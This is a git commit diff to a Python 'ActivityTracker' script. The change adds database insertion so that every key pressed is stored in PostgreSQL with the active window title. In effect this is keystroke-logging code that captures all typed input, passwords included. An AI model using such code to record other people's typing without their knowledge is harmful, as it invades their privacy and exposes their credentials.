c534ce9c8f6a281d15742db5016e1eacbc7af3f8
Stas <stasnovalenco3@gmail.com>
2025-03-26 13:43:16 +0200

    Added db insertion

--- script.py
+++ script.py
@@ -2,13 +2,11 @@ from pynput import keyboard
 from time import gmtime, strftime
 import pygetwindow as gw
 import psycopg2 
-import os
 from DB_DATA import DBNAME, USERNAME, PASSWORD, HOST, PORT
 
 class ActivityTracker:
     def __init__(self):
-        self.last_window= None
-        self.conn= self._connect_to_datbase()
+        self.conn= self._connect_to_database()
 
     def on_release(self, key):
         cursor= self.conn.cursor()
@@ -16,14 +14,26 @@ class ActivityTracker:
         INSERT INTO input_log(context, key_value) 
         VALUES(%s, %s);
         """
+
         try:
             print(key.char)
+            data= (
+                gw.getActiveWindowTitle(),
+                key.char
+            )
         except AttributeError:
             print(key)
+            data= (
+                gw.getActiveWindowTitle(),
+                str(key),
+            )
+
+        cursor.execute(insert_query, data)
+        self.conn.commit()
+        cursor.close()
 
 
-
-    def _connect_to_datbase(self):
+    def _connect_to_database(self):
         try:
             conn= psycopg2.connect(
                 dbname= DBNAME,
